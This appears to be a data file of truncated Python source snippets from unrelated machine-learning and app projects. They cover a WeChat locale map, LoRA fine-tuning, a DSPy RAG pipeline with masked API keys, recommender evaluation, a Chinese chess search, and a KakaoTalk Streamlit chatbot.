{\"en-US\": \"Search\",         \"zh-CN\": \"\u641c\u7d22\",            \"zh-TW\": \"\u641c\u5c0b\"},\n        \"send\":         {\"en-US\": \"Send (S)\",       \"zh-CN\": \"\u53d1\u9001(S)\",         \"zh-TW\": \"\u50b3\u9001\uff08S\uff09\"},\n        \"contact\":      {\"en-US\": \"contact\",        \"zh-CN\": \"\u8054\u7cfb\u4eba\",          \"zh-TW\": \"\u806f\u7d61\u4eba\"},\n        \"group_chat\":   {\"en-US\": \"Group Chat\",     \"zh-CN\": \"\u7fa4\u804a\",            \"zh-TW\": \"\u7fa4\u804a\"},\n        \"manage_contacts\":  {\"en-US\": \"Manage Contacts\", \"zh-CN\": \"\u901a\u8baf\u5f55\u7ba1\u7406\", \"zh-TW\": \"\u901a\u8a0a\u9304\u7ba1\u7406\"},\n\n        \"message\":      {\"en-US\": \"\u6d88\u606f\",           \"zh-CN\": \"\u6d88\u606f\",            \"zh-TW\": \"\u6d88\u606f\"},\n        \"chat_history\": {\"en-US\": \"Chat History\",   \"zh-CN\": \"\u804a\u5929\u8bb0\u5f55\",        \"zh-TW\": \"\u804a\u5929\u8a18\u9304\"},\n        \"photos_n_videos\":  {\"en-US\": \"Photos & Videos\", \"zh-CN\": \"\u56fe\u7247\u4e0e\u89c6\u9891\", \"zh-TW\": \"\u5716\u7247\u8207\u5f71\u7247\"},\n        \"copy\":      {\"en-US\": \"Copy\",              \"zh-CN\": \"\u590d\u5236\",            \"zh-TW\": \"\u8907\u88fd\"},\n    }\n\n    \"\"\"\n    @param locale: the locale of the WeChat UI, either \"en-US\", \"zh-CN\", or \"zh-TW\"\n    \"\"\"\n    def __init__(self, locale=\"en-US\"):\n        for key, value in WeChatLocale.MAPPING.items():\n            setattr(self, key, value[locale])\n    \n    @staticmethod\n    def getSupportedLocales():\n        return list(WeChatLocale.MAPPING.values())[0].keys()\n\nif __name__ == \"__main__\":\n    print(WeChatLocale.getSupportedLocales())\n\n    lc = WeChatLocale(\"zh-CN\")\n\n",
    "from typing import List\nimport os\nfrom pathlib import Path\nimport edc.utils.llm_utils as llm_utils\nimport re\nfrom edc.utils.e5_mistral_utils import MistralForSequenceEmbedding\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nimport numpy as np\nimport copy\n\n\nclass EntityExtractor:\n    # The class to handle the last stage: Schema Canonicalization\n    def __init__(self, model: AutoModelForCausalLM = None, tokenizer: AutoTokenizer = None, openai_model=None) -> None:\n        # The canonicalizer uses an embedding model to first fetch candidates from the target schema, then uses a verifier schema to decide which one to canonicalize to or not\n        # canonoicalize at all.\n\n        assert openai_model is not None or (model is not None and tokenizer is not None)\n        self.model = model\n        self.tokenizer = tokenizer\n        self.openai_model = openai_model\n\n    def extract_entities(self, input_text_str: str, few_shot_examples_str: str, prompt_template_str: str):\n        filled_prompt = prompt_template_str.format_map(\n            {\"few_shot_examples\": few_shot_examples_str, \"input_text\": input_text_str}\n        )\n        messages = [{\"role\": \"user\", \"content\": filled_prompt}]\n\n        if self.openai_model is None:\n            # llm_utils.generate_completion_transformers([messages], self.model, self.tokenizer, device=self.device)\n            completion = llm_utils.generate_completion_transformers(\n                [messages], self.model, self.tokenizer, device=self.model.device, answer_prepend=\"Entities: \"\n            )[0]\n        else:\n            completion = llm_utils.openai_chat_completion(self.openai_model, None, messages)\n        extracted_entities = llm_utils.parse_raw_entities(completion)\n        return extracted_entities\n\n    def merge_entities(\n        self, input_text: str, entity_list_1: List[str], entity_list_2: List[str], prompt_template_str: str\n    ):\n        filled_prompt = prompt_template_str.format_map(\n            {\"input_text\": input_text, \"entity_list_1\": entity_list_1, \"entity_list_2\": entity_list_2}\n        )\n        messages = [{\"role\": \"user\", \"content\": filled_prompt}]\n\n        if self.openai_model is None:\n            # llm_utils.generate_completion_transformers([messages], self.model, self.tokenizer, device=self.device)\n            completion = llm_utils.generate_completion_transformers(\n                [messages], self.model, self.tokenizer, device=self.model.device, answer_prepend=\"Answer: \"\n            )[0]\n        else:\n            completion = llm_utils.openai_chat_completion(self.openai_model, None, messages)\n        extracted_entities = llm_utils.parse_raw_entities(completion)\n        return extracted_entities\n\n    def retrieve_relevant_relations(self, query_input_text: str, top_k=10):\n        target_relation_list = list(self.target_schema_embedding_dict.keys())\n        target_relation_embedding_list = list(self.target_schema_embedding_dict.values())\n\n        query_embedding = llm_utils.get_embedding_e5mistral(\n            self.model,\n            self.tokenizer,\n            query_input_text,\n            \"Retrieve descriptions of relations that are present in the given text.\",\n        )\n        scores = np.array([query_embedding]) @ np.array(target_relation_embedding_list).T\n\n        scores = scores[0]\n        highest_score_indices = np.argsort(-scores)\n\n        return {\n            target_relation_list[idx]: self.target_schema_dict[target_relation_list[idx]]\n            for idx in highest_score_indices[:top_k]\n        }, [scores[idx] for idx in highest_score_indices[:top_k]]\n",
    "#Fine tune a LLM Model in Huggingface with LORA https://arxiv.org/abs/2106.09685\n#Step 1: Define your model target\n#Step 2: define supervised or not, and then prepare the dataset for training\n#Step 3: you need to choose a suitable base mode, and use the config. ttps://huggingface.co/docs/transformers/model_doc/auto#transformers.AutoModelForSequenceClassification\n#Step 4: start training with PEFT LORA Training\n#Step 5: Save model check point, and reuse it and with pretrained model, you can get an adapted one. \"output_dir\"\n#Step 6: Reuse it and evaluatate it with evaluation dataset. https://huggingface.co/docs/trl/main/en/use_model\n#Step 7: If it is good, you could also upload into HuggingFace\n\n#Very detail guide is: https://www.youtube.com/watch?v=eC6Hd1hFvos\n\n\nfrom datasets import load_dataset, DatasetDict, Dataset\nfrom transformers import (\n    AutoTokenizer,\n    AutoConfig,\n    AutoModelForSequenceClassification,\n    DataCollatorWithPadding,\n    TrainingArguments,\n    Trainer)\n\nfrom peft import PeftModel, PeftConfig, get_peft_model, LoraConfig\nimport evaluate\nimport torch\nimport numpy as np\nimport time\n\nstart = time.perf_counter()\n\n# load dataset\ndataset = load_dataset('shawhin/imdb-truncated')\n\n# display % of training data with label=1\nnp.array(dataset['train']['label']).sum()/len(dataset['train']['label'])\n\n#Choose base model, which to be found in https://huggingface.co/docs/transformers/model_doc/auto#transformers.AutoModelForSequenceClassification\nmodel_checkpoint = 'distilbert-base-uncased'\n#model_checkpoint = 'Qwen/Qwen1.5-7B-Chat' #Base model not yet available, no info in model card\n#model_checkpoint = 'roberta-base' # you can alternatively use roberta-base but this model is bigger thus training will take longer\n\n# define label maps\nid2label = {0: \"Negative\", 1: \"Positive\"}\nlabel2id = {\"Negative\":0, \"Positive\":1}\n\n# generate classification model from model_checkpoint\nmodel = AutoModelForSequenceClassification.from_pretrained(\n    model_checkpoint, num_labels=2, id2label=id2label, label2id=label2id)\n\n# create tokenizer\ntokenizer = AutoTokenizer.from_pretrained(model_checkpoint, add_prefix_space=True)\n\n# add pad token if none exists\nif tokenizer.pad_token is None:\n    tokenizer.add_special_tokens({'pad_token': '[PAD]'})\n    model.resize_token_embeddings(len(tokenizer))\n\n# create tokenize function\ndef tokenize_function(examples):\n    # extract text\n    text = examples[\"text\"]\n\n    #tokenize and truncate text\n    tokenizer.truncation_side = \"left\"\n    tokenized_inputs = tokenizer(\n        text,\n        return_tensors=\"np\",\n        truncation=True,\n        max_length=512\n    )\n\n    return tokenized_inputs\n\n# tokenize training and validation datasets\ntokenized_dataset = dataset.map(tokenize_function, batched=True)\n\n# create data collator\ndata_collator = DataCollatorWithPadding(tokenizer=tokenizer)\n\n# import accuracy evaluation metric\naccuracy = evaluate.load(\"accuracy\")\n\n# define an evaluation function to pass into trainer later\ndef compute_metrics(p):\n    predictions, labels = p\n    predictions = np.argmax(predictions, axis=1)\n\n    return {\"accuracy\": accuracy.compute(predictions=predictions, references=labels)}\n\n# define list of examples\ntext_list = [\"It was good.\", \"Not a fan, don't recommed.\", \"Better than the first one.\", \"This is not worth watching even once.\", \"This one is a pass.\",]\n\nprint(\"Untrained model predictions:\")\nprint(text_list)\nprint(\"----------------------------\")\nfor text in text_list:\n    # tokenize text\n    inputs = tokenizer.encode(text, return_tensors=\"pt\")\n    # compute logits\n    logits = model(inputs).logits\n    # convert logits to label\n    predictions = torch.argmax(logits)\n    print(text + \" - \" + id2label[predictions.tolist()])\n\npeft_config = LoraConfig(task_type=\"SEQ_CLS\",\n                        r=4,\n                        lora_alpha=32,\n                        lora_dropout=0.01,\n                        target_modules = ['q_lin'])\n\nmodel = get_peft_model(model, peft_config)\nmodel.print_trainable_parameters()\n\n# hyperparameters\nlr = 1e-3\nbatch_size = 4\nnum_epochs = 10\n\n# define training arguments\ntraining_args = TrainingArguments(\n    output_dir= model_checkpoint + \"-lora-text-classification\",\n    learning_rate=lr,\n    per_device_train_batch_size=batch_size,\n    per_device_eval_batch_size=batch_size,\n    num_train_epochs=num_epochs,\n    weight_decay=0.01,\n    evaluation_strategy=\"epoch\",\n    save_strategy=\"epoch\",\n    load_best_model_at_end=True,\n)\n\n# creater trainer object\ntrainer = Trainer(\n    model=model,\n    args=training_args,\n    train_dataset=tokenized_dataset[\"train\"],\n    eval_dataset=tokenized_dataset[\"validation\"],\n    tokenizer=tokenizer,\n    data_collator=data_collator, # this will dynamically pad examples in each batch to be equal length\n    compute_metrics=compute_metrics,\n)\n\n# train model\ntrainer.train()\nend = time.perf_counter()\nmodel.to('mps') # moving to mps for Mac (can alternatively do 'cpu')\n\nprint(\"Trained model predictions:\")\nprint(\"--------------",
    "# Import modules\r\nimport os\r\nimport sys\r\nimport dspy\r\nimport pkg_resources\r\nfrom dspy import Signature, InputField, OutputField, Module, Predict, Prediction\r\nfrom llama_parse import LlamaParse\r\nfrom llama_index.core import VectorStoreIndex, StorageContext, load_index_from_storage\r\nfrom dspy.teleprompt import BootstrapFewShot\r\nfrom dspy.evaluate import answer_exact_match, answer_passage_match\r\nfrom dspy import Example\r\n\r\n# Set environmental variables\r\nos.environ[\"OPENAI_API_KEY\"] = \"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx7M\"\r\nopenai_api_key = os.environ[\"OPENAI_API_KEY\"]\r\n\r\n# Define path to project\r\nrepo_path = 'C:\\\\Users\\\\user\\\\Documents\\\\Jan 2024\\\\Projects\\\\RAGs\\\\New\\\\DSPy\\\\DSPyRAG'\r\n\r\n# Add the project path to your system path\r\nif repo_path not in sys.path:\r\n    sys.path.append(repo_path)\r\n\r\n# Set up the cache for this script\r\nos.environ[\"DSP_NOTEBOOK_CACHEDIR\"] = os.path.join(repo_path, 'cache')\r\n\r\n# Check if dspy-ai is installed\r\nif not \"dspy-ai\" in {pkg.key for pkg in pkg_resources.working_set}:\r\n    print(\"Please install dspy-ai and openai using pip\")\r\n\r\n# Configure LM\r\nturbo = dspy.OpenAI(model='gpt-3.5-turbo')\r\ndspy.settings.configure(lm=turbo)\r\n\r\n# Parse file\r\nparser = LlamaParse(\r\n    api_key=\"llx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxGh7\",\r\n        result_type=\"text\",\r\n        language=\"en\",\r\n        varbose=True\r\n    )\r\n\r\n# Create documents and index\r\ndocuments = parser.load_data(\"C:\\\\Users\\\\user\\\\Documents\\\\Jan 2024\\\\Projects\\\\RAGs\\\\Files\\\\PhilDataset.pdf\")\r\nprint(\"Documents created\")\r\nindex = VectorStoreIndex.from_documents(documents)\r\n\r\nindex.set_index_id(\"vector_index\")\r\nindex.storage_context.persist(\"./storage\")\r\n\r\nstorage_context = StorageContext.from_defaults(persist_dir=\"storage\")\r\n\r\n# Create query engine as index\r\nindex = load_index_from_storage(storage_context, index_id=\"vector_index\")\r\nquery_engine = index.as_query_engine(response_mode=\"tree_summarize\")\r\n\r\n# Create signature\r\nclass GenerateAnswer(dspy.Signature):\r\n    \"\"\"Answer questions with short factoid answers.\"\"\"\r\n    context = dspy.InputField(desc=\"may contain relevant facts\")\r\n    question = dspy.InputField()\r\n    answer = dspy.OutputField(desc=\"Often between 5 and 10 words\")\r\n    print(\"Class 1 created\")\r\n\r\n# Define modules\r\nclass RAG(dspy.Module):\r\n    def __init__(self, num_passages=3):\r\n        super().__init__()\r\n        self.query_engine = query_engine\r\n        self.generate_answer = Predict(GenerateAnswer)\r\n        print(\"Class 2 created\")\r\n\r\n    def forward(self, question):\r\n        response = self.query_engine.query(question)\r\n        context = response.response\r\n        prediction = self.generate_answer(context=context, question=question)\r\n        return dspy.Prediction(context=context, answer=prediction.answer)\r\ncustom_rag = RAG(query_engine)\r\n\r\nquestion = \"What did Phil wanted to become when he grew up?\"\r\npred = custom_rag(question)\r\nprint(f\"Question: {question}\")\r\nprint(f\"Predicted Answer: {pred.answer}\")\r\n\r\n# Create validation logic \r\ndef validate_context_and_answer(example, pred, trace=None):\r\n    answer_EM = answer_exact_match(example, pred)\r\n    answer_PM = answer_passage_match(example, pred)\r\n    return answer_EM and answer_PM\r\n\r\n# Define examples with the necessary fields\r\ntrain_example1 = Example(question=\"What did young Philemon wanted to become when he grew up?\", answer=\"Engineer\")\r\ntrain_example2 = Example(question=\"What did Philemon realize his curiosity was pushing him towards as he grew older?\", answer=\"Sciences\")\r\ntrain_example3 = Example(question=\"How many years after graduation did Philemon spent working in the academic writing industry?\", answer=\"Eight\")\r\ntrain_example4 = Example(question=\"Which is one of the subjects that Philemon handled in academic writing assignments?\", answer=\"Nursing\")\r\ntrain_example5 = Example(question=\"What made the global academic system to go into hibernation?\", answer=\"Covid\")\r\ntrain_example6 = Example(question=\"Which year did the usual peak season failed to materialize?\", answer=\"2021\")\r\ntrain_example7 = Example(question=\"When was the ranking systems introduced to deny all other writers the chance to see available orders?\", answer=\"2023\")\r\ntrain_example8 = Example(question=\"In 2024, how many orders had Philemon completed until February 15?\", answer=\"4\")\r\ntrain_example9 = Example(question=\"What was the main reason Philemon wanted to branch into other high-demand fields?\", answer=\"Income\")\r\ntrain_example10 = Example(question=\"What did Philemon eventually venture into in his undergraduate studies?\", answer=\"Chemistry\")\r\n\r\n# Tell DSPy that the 'question' field is the input\r\ntrainset = [\r\n    train_example1.with_inputs('question'),\r\n    train_example2.with_inputs('question'),\r\n    train_example3.with_inputs('question'),\r\n    train_example4.with_inputs('question'),\r\n    train_example5.with_inputs('question'),\r\n    train_example6.with_inputs('question'),\r\n    train_example7.with_inputs('question'),\r\n    train_example8.with_inputs('question'),\r\n    train_example9.with_inputs('qu",
    "import numpy as np\nimport torch\nfrom torch.utils.data import Dataset, DataLoader\nfrom .dataset import *\nimport torch.distributed as dist\nimport os\nimport math\nfrom torch.utils.data.dataloader import default_collate\ndef my_collate(batch):\n    imgs, texts = zip(*batch)\n    imgs = torch.stack(imgs, dim=0)\n    texts = torch.stack(texts, dim=0)\n    \n    return imgs, texts\n\n\ndef item_collate_fn(arr):\n    arr = torch.LongTensor(arr)\n    return arr\nclass ItemsDataset(Dataset):\n    def __init__(self, data):\n        self.data = data\n\n    def __getitem__(self, idx):\n        return self.data[idx]\n\n    def __len__(self):\n        return self.data.shape[0]\n\ndef id_collate_fn(arr):\n    arr = torch.LongTensor(arr)\n    return arr\n\n\ndef print_metrics(x, Log_file, v_or_t):\n    Log_file.info(v_or_t + \"_results   {}\".format('\\t'.join([\"{:0.5f}\".format(i * 100) for i in x])))\n\n\ndef get_mean(arr):\n    return [i.mean() for i in arr]\n\n\ndef distributed_concat(tensor, num_total_examples):\n    output_tensors = [tensor.clone() for _ in range(dist.get_world_size())]\n    dist.all_gather(output_tensors, tensor)\n    concat = torch.cat(output_tensors, dim=0)\n    return concat[:num_total_examples]\n\n\ndef eval_concat(eval_list, test_sampler):\n    eval_result = []\n    for eval_m in eval_list:\n        eval_m_cpu = distributed_concat(eval_m, len(test_sampler.dataset)) \\\n            .to(torch.device(\"cpu\")).numpy()\n        eval_result.append(eval_m_cpu.mean())\n    return eval_result\n\n\ndef metrics_topK(y_score, y_true, item_rank, topK, local_rank):\n    order = torch.argsort(y_score, descending=True)\n    y_true = torch.take(y_true, order)\n    rank = torch.sum(y_true * item_rank)\n    eval_ra = torch.zeros(2).to(local_rank)\n    if rank <= topK:\n        eval_ra[0] = 1\n        eval_ra[1] = 1 / math.log2(rank + 1)\n    return eval_ra\n\ndef get_MM_item_embeddings(model, item_num, item_id_to_keys,item_content, test_batch_size, args, local_rank):\n    model.eval()\n    item_dataset = Build_MM_EMBED_Eval_Dataset(args=args,data=np.arange(item_num + 1), item_id_to_keys=item_id_to_keys,item_content=item_content,db_path=os.path.join(args.root_data_dir, args.dataset, args.lmdb_data),resize=args.CV_resize)\n    item_dataloader = DataLoader(item_dataset, batch_size=test_batch_size,\n                                 num_workers=args.num_workers, pin_memory=True,collate_fn=my_collate)\n    item_embeddings_cv = []\n    item_embeddings_text = []\n    if \"inter\" in args.modality:\n        item_embeddings_inter = []\n\n    with torch.no_grad():\n        for input_ids_cv, input_ids_text in item_dataloader:\n            input_ids_cv, input_ids_text= input_ids_cv.to(local_rank),input_ids_text.to(local_rank)\n            if \"inter\" == args.modality:\n                item_emb_cv, item_emb_texts = model.module.mm_encoder(input_ids_cv,input_ids_text)\n                item_emb_text = item_emb_texts[0]\n                item_emb_inter = item_emb_texts[1].to(torch.device(\"cpu\")).detach()\n\n                item_embeddings_inter.extend(item_emb_inter)\n            elif \"inter\" in args.modality and \"intra\" in args.modality:\n                item_emb_cv, item_emb_texts = model.module.mm_encoder(input_ids_cv,input_ids_text)\n                item_emb_cv = item_emb_cv.to(torch.device(\"cpu\")).detach()\n                item_emb_text = item_emb_texts[0].to(torch.device(\"cpu\")).detach()\n                item_emb_inter = item_emb_texts[1].to(torch.device(\"cpu\")).detach()\n\n                item_embeddings_cv.extend(item_emb_cv)\n                item_embeddings_text.extend(item_emb_text)\n                item_embeddings_inter.extend(item_emb_inter)\n            else:\n                item_emb_cv,item_emb_text = model.module.mm_encoder(input_ids_cv,input_ids_text)\n                item_emb_cv,item_emb_text = item_emb_cv.to(torch.device(\"cpu\")).detach(),item_emb_text.to(torch.device(\"cpu\")).detach() \n                item_embeddings_cv.extend(item_emb_cv)\n                item_embeddings_text.extend(item_emb_text)\n    if \"inter\" == args.modality:\n        return item_emb_cv,[item_emb_text,torch.stack(tensors=item_embeddings_inter, dim=0)] # cv and text are None\n    elif \"inter\" in args.modality and \"intra\" in args.modality:\n        return torch.stack(tensors=item_embeddings_cv, dim=0),[torch.stack(tensors=item_embeddings_text, dim=0),torch.stack(tensors=item_embeddings_inter, dim=0)]\n            \n    return torch.stack(tensors=item_embeddings_cv, dim=0),torch.stack(tensors=item_embeddings_text, dim=0)\n\n\n\ndef get_itemId_embeddings(model, item_num, test_batch_size, args, local_rank):\n    model.eval()\n    item_dataset = Build_Id_Eval_Dataset(data=np.arange(item_num + 1))\n    item_dataloader = DataLoader(item_dataset, batch_size=test_batch_size,\n                                 num_workers=args.num_workers, pin_memory=True, collate_fn=id_collate_fn)\n    item_embeddings = []\n    with torch.no_grad():\n        for input_ids in item_dataloader:\n            input_ids = input_ids.to(local_rank)\n            item_emb = model.module.id_embeddi",
    "\"\"\"alpha-beta search\"\"\"\n\nimport dataclasses\nimport math\nimport typing\n\ntype Coordinate = tuple[int, int]\n\"\"\"the coordinate of chess\"\"\"\n\ntype Operation = tuple[Coordinate, Coordinate] | None\n\"\"\"a valid operation\"\"\"\n\ntype ID = typing.Literal[\n    -8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8]\n\"\"\"all ids of chesses\"\"\"\n\n\nSCORE_TABLE: dict[ID, float] = {\n    0: 0,  # \u7a7a\n    1: 100,  # \u5e05\n    2: 3,  # \u4ed5\n    3: 3,  # \u76f8\n    4: 1,  # \u5175\n    5: 2,  # \u8fc7\u6cb3\u5175\n    6: 5,  # \u99ac\n    7: 6,  # \u7832\n    8: 12,  # \u8eca\n    -1: -100,  # \u5c06\n    -2: -3,  # \u58eb\n    -3: -3,  # \u8c61\n    -4: -1,  # \u5352\n    -5: -2,  # \u8fc7\u6cb3\u5352\n    -6: -5,  # \u9a6c\n    -7: -6,  # \u70ae\n    -8: -12,  # \u8f66\n}\n\"\"\"score of each chess\"\"\"\n\n\nDELTA: dict[int, tuple] = {\n    1: ((0, 1), (0, -1), (1, 0), (-1, 0)),\n    2: ((-1, -1), (-1, 1), (1, 1), (1, -1)),\n    3: ((-2, -2), (-2, 2), (2, 2), (2, -2)),\n    6: ((1, 2), (1, -2), (-1, 2), (-1, -2), (2, 1), (2, -1), (-2, 1), (-2, -1)),\n    7: ((range(1, 10), (0,)*9), (range(-1, -10, -1), (0,)*9), ((0,)*8, range(1, 9)), ((0,)*8, range(-1, -9, -1))),\n}\n\n\n@dataclasses.dataclass\nclass Node:\n    \"\"\"Node of the min-max searching tree\"\"\"\n\n    score: float\n    operation: Operation = None\n\n\ndef evaluate(data: list[list[int]], score: float = 0) -> float:\n    \"\"\"get an evaluate score of the board data\"\"\"\n    for lines in data:\n        for item in lines:\n            score += SCORE_TABLE[item]\n    return score\n\n\ndef valid_coordinate(data: list[list[int]], reverse: bool = False, *, filter_id: int = 0) -> list[Coordinate]:\n    \"\"\"get all valid coordinates on board\"\"\"\n    judge_function: typing.Callable[[int], bool] = (\n        lambda x: x < -filter_id) if reverse else (lambda x: x > filter_id)\n    valid_coordinates: list[Coordinate] = [\n        (i, j)\n        for i in range(10)\n        for j in range(9)\n        if judge_function(data[i][j])]\n    # NOTE: \u6392\u5e8f\u4f18\u5316\uff0c\u66f4\u5feb\u526a\u679d\uff1a\u4f18\u5148\u6269\u5c55\u653b\u51fb\u6027\u5f3a\u7684\u68cb\u5b50\u7684\u8282\u70b9\n    # valid_coordinates.sort(key=lambda x: -abs(data[x[0]][x[1]]))\n    return valid_coordinates\n\n\ndef valid_operation(data: list[list[int]], operation: Operation, *, attack: bool = True) -> bool:\n    \"\"\"judge whether the operation is valid\"\"\"\n    (si, sj), (ei, ej) = operation\n    reverse = data[si][sj] < 0\n    key_id = -1 if reverse else 1  # \u6211\u65b9\u5c06\u5e05 ID\n    sv, ev = data[si][sj], data[ei][ej]\n    if attack and ev == 0:\n        return False\n    process(data, si, sj, ei, ej)\n    valid_coordinates = valid_coordinate(data, not reverse)  # \u5bf9\u65b9\u8d70\u6cd5\n    valid_coordinates = filter(lambda c: abs(\n        data[c[0]][c[1]]) >= 5, valid_coordinates)  # \u53ea\u8003\u8651\u653b\u51fb\u6027\u68cb\u5b50\n    for coordinate in valid_coordinates:\n        for destination in possible_destination(data, *coordinate):\n            if data[destination[0]][destination[1]] == key_id:  # \u6211\u65b9\u5c06\u5e05\u5728\u5bf9\u65b9\u653b\u51fb\u8303\u56f4\u5185\n                recover(data, si, sj, ei, ej, sv, ev)\n                return False\n    # NOTE: \u201c\u767d\u8138\u5c06\u201d\u7279\u6b8a\u60c5\u51b5\u5904\u7406\n    for i in range(3):\n        for j in range(3, 5+1):\n            if data[i][j] == -1:  # \u53d1\u73b0\u201c\u5c06\u201d\uff0c\u4f4d\u7f6e (i, j)\n                for ni in range(i+1, 10):\n                    if data[ni][j] == 0:\n                        continue\n                    elif data[ni][j] == 1:\n                        recover(data, si, sj, ei, ej, sv, ev)\n                        return False\n                    else:\n                        break\n    recover(data, si, sj, ei, ej, sv, ev)\n    return True\n\n\ndef possible_destination(data: list[list[int]], i: int, j: int) -> list[Coordinate]:\n    \"\"\"get all possible destination of chess\"\"\"\n    possible_destinations: list[Coordinate] = []\n\n    match abs(id := data[i][j]):\n        case 1:  # \u5c06\u5e05\n            for di, dj in DELTA[1]:\n                ni, nj = i + di, j + dj\n                if (0 <= ni <= 2 or 7 <= ni <= 9) and 3 <= nj <= 5:  # \u4f4d\u7f6e\u5224\u5b9a\n                    if id * data[ni][nj] <= 0:  # \u89c4\u5219\u5224\u5b9a\n                        possible_destinations.append((ni, nj))\n            # NOTE: \u201c\u767d\u8138\u5c06\u201d\u7279\u5224\u5728\u5408\u6cd5\u6027\u5224\u5b9a\u4e2d\n        case 2:  # \u58eb\u4ed5\n            for di, dj in DELTA[2]:\n                ni, nj = i + di, j + dj\n                if (0 <= ni <= 2 or 7 <= ni <= 9) and 3 <= nj <= 5:  # \u4f4d\u7f6e\u5224\u5b9a\n                    if id * data[ni][nj] <= 0:  # \u89c4\u5219\u5224\u5b9a\n                        possible_destinations.append((ni, nj))\n        case 3:  # \u8c61\u76f8\n            for di, dj in DELTA[3]:\n                ni, nj = i + di, j + dj\n                if ni in (0, 2, 4, 5, 7, 9) and 0 <= nj <= 8:  # \u4f4d\u7f6e\u5224\u5b9a\n                    if id * data[ni][nj] <= 0:  # \u89c4\u5219\u5224\u5b9a\n                        if data[(ni+i)//2][(nj+j)//2] == 0:  # \u6487\u817f\u5224\u5b9a\n                            possible_destinations.append((ni, nj))\n        case 4:  # \u5352\u5175\n            di, dj = (1 if id < 0 else -1, 0)\n            ni, nj = i + di, j + dj\n            # NOTE: \u65e0\u4f4d\u7f6e\u5224\u5b9a\uff0c\u8fc7\u6cb3\u4f1a\u8f6c\u53d8\u7c7b\u578b\n            if id * data[ni][nj] <= 0:  # \u89c4\u5219\u5224\u5b9a\n                possible_destinations.append((ni, nj))\n        case 5:  # \u5352\u5175\uff08\u8fc7\u6cb3\uff09\n            for di, dj in (1 if id < 0 else -1, 0), (0, 1), (0, -1):\n                ni, nj = i + di, j + dj\n                if 0 <= ni <= 9 and 0 <= nj <= 8:  # \u4f4d\u7f6e\u5224\u5b9a\n                    if id * data[ni][nj] <= 0:  # \u89c4\u5219\u5224\u5b9a\n                        pos",
    "import os\nimport streamlit as st\nfrom langchain_core.messages import ChatMessage\nfrom langchain_openai import ChatOpenAI\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.runnables import (\n    RunnableLambda,\n    RunnablePassthrough,\n    ConfigurableField,\n)\nfrom langchain_community.document_transformers import LongContextReorder\nfrom langchain_text_splitters import RecursiveCharacterTextSplitter\nfrom langchain_community.vectorstores import Chroma, FAISS\nimport kakaotalk_loader as kakao\nimport prompt as prmpt\nimport embeddings\nimport retriever\nimport tempfile\nfrom utils import print_messages, StreamHandler\nfrom pathlib import Path\n\nst.set_page_config(page_title=\"\uce74\ud1a1GPT\", page_icon=\"\ud83d\udcac\")\nst.title(\"\uce74\ud1a1GPT\ud83d\udcac\")\nst.markdown(\n    \"\"\"by [\ud14c\ub514\ub178\ud2b8](https://www.youtube.com/c/teddynote). [\uc18c\uc2a4\ucf54\ub4dc](https://github.com/teddylee777/kakaotalk-gpt) \ud65c\uc6a9\uc2dc \ubc18\ub4dc\uc2dc **\ucd9c\ucc98**\ub97c \ubc1d\ud600\uc8fc\uc138\uc694\ud83d\ude4f\"\"\"\n)\n\nif \"messages\" not in st.session_state:\n    st.session_state[\"messages\"] = []\n\nwith st.sidebar:\n    openai_api_key = st.text_input(\n        \"\ud83d\udd11 OpenAI API \ud0a4\",\n        type=\"password\",\n    )\n    if openai_api_key:\n        st.session_state[\"OPENAI_API_KEY\"] = openai_api_key\n    st.markdown(\n        \"\ud83d\udccc CSV\ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc \ubc29\ubc95\\n\\n`\ucc44\ud305\ubc29`-`\uc6b0\uce21\uc0c1\ub2e8 \ud584\ubc84\uac70\uba54\ub274`-`\ucc44\ud305\ubc29 \uc124\uc815`-`\ub300\ud654 \ub0b4\uc6a9 \uad00\ub9ac`-`\ub300\ud654 \ub0b4\uc6a9 \uc800\uc7a5`\"\n    )\n    # NOTE : choh(2024.04.05) - 'csv'\uc640 'txt' \ud30c\uc77c\uc744 \uc5c5\ub85c\ub4dc\ud560 \uc218 \uc788\ub3c4\ub85d \uc218\uc815\n    # kakaotalk_file = st.file_uploader(\"\ud83d\udcc4 \uce74\ud1a1 CSV \ud30c\uc77c \uc5c5\ub85c\ub4dc\", type=[\"csv\"])\n    kakaotalk_file = st.file_uploader(\"\ud83d\udcc4 \uce74\ud1a1 CSV \ud30c\uc77c \uc5c5\ub85c\ub4dc\", type=['csv','txt'])\n    if kakaotalk_file:\n        if \"OPENAI_API_KEY\" not in st.session_state:\n            st.info(\"OpenAI API Key\ub97c \uc785\ub825\ud574 \uc8fc\uc138\uc694.\")\n        else:\n            st.session_state[\"kakaotalk_file\"] = kakaotalk_file\n\nif \"kakaotalk_file\" in st.session_state and \"retriever\" not in st.session_state:\n    with st.sidebar:\n        with st.status(\"\ud30c\uc77c\uc744 \ucc98\ub9ac \uc911\uc785\ub2c8\ub2e4 \ud83e\uddd1\u200d\ud83d\udcbb\ud83d\udc69\u200d\ud83d\udcbb\", expanded=True) as status:\n            \n            # NOTE : choh(2024.04.05) - \uc708\ub3c4\uc6b0 \uad8c\ud55c \uc5d0\ub7ec \ud574\uacb0\n            FLAG_DELETE = True\n            if os.name == 'nt':\n                FLAG_DELETE = False\n                \n            with tempfile.NamedTemporaryFile(delete=FLAG_DELETE) as f:\n                f.write(st.session_state[\"kakaotalk_file\"].read())\n                f.flush()\n                \n                # \uce74\uce74\uc624\ud1a1 \ub85c\ub354\n                # loader = kakao.KaKaoTalkLoader(f.name, encoding=\"utf8\")\n                \n                # NOTE : choh(2024.04.05) - \ud30c\uc77c\uc758 \ud655\uc7a5\uc790\ub97c loader\uc5d0 \uc804\ub2ec \ud560 \uc218 \uc788\ub3c4\ub85d \uc218\uc815\n                # \uc9c1\uc811 \uc804\ub2ec\ud558\uc9c0 \uc54a\uc73c\uba74, hash\ub41c \ud30c\uc77c\uba85\uc73c\ub85c \uc804\ub2ec\ub418\uc11c \ud655\uc7a5\uc790\uac00 \uc5c6\uc5b4\uc9d0\n                _, file_suffix = os.path.splitext(st.session_state[\"kakaotalk_file\"].name)\n                loader = kakao.KaKaoTalkLoader(f.name, file_suffix, encoding=\"utf8\")\n\n                text_splitter = RecursiveCharacterTextSplitter(\n                    chunk_size=500, chunk_overlap=0\n                )\n                documents = 